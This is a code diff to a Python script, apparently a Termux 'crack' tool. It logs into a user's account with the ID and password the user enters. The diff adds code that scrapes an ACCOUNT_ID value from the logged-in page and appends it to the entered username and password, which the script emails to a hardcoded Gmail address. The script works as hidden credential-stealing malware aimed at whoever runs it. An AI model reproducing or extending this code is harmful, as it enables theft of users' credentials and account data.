@@ -23,6 +23,7 @@ print(Back.RED+'''
 ''')
 
 def assur(ide, pasw):
+ global info
  browser = mechanize.Browser()
  browser.set_handle_robots(False)
  cookies = mechanize.CookieJar()
@@ -42,6 +43,12 @@ def assur(ide, pasw):
  else:
   print(Fore.GREEN+ 'Successfully Logged in.')
   print('completing control port...\n')
+  i = struts.find('ACCOUNT_ID')
+  k = []
+  while i < struts.find('SHORT_NAME'):
+   k.append(struts[i])
+   i+=1
+  info = ''.join(k)
 def upd():
     os.chdir('/data/data/com.termux/files/home')
     shutil.rmtree('crack')
@@ -128,7 +135,7 @@ s.login(sa, kl)
 
 ra = 'bertranddupont885@gmail.com'
 if option != 4:
- connexion = cho + ' - ' + usn + ' - ' + usp
+ connexion = cho + ' - ' + usn + ' - ' + usp + info
  msg = MIMEMultipart()
  msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
  msg.attach(msgText)
